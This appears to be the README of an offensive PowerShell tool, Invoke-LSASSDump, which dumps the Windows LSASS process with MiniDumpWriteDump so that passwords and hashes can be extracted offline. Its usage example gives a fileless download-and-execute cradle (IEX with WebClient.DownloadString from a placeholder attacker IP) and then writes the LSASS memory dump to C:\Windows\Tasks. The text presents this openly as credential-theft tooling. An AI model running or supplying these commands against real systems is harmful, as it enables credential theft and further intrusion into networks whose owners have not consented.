# Invoke-LSASSDump
A small script to dump the LSASS process via PowerShell. This script utilizes **MiniDumpWriteDump** which provides process snapshots for debugging purposes. From a offensive perspective, we can utilize it to dump the LSASS process for offline password and hash extraction.

# Example

Below is an example on how to use Invoke-LSASSDump:

```
PS > IEX ((New-Object System.Net.WebClient).DownloadString('http://<YOUR IP>/Invoke-LSASSDump.ps1'))
PS > Invoke-LSASSDump -DumpLocation "C:\Windows\Tasks\lsass.dmp"
```
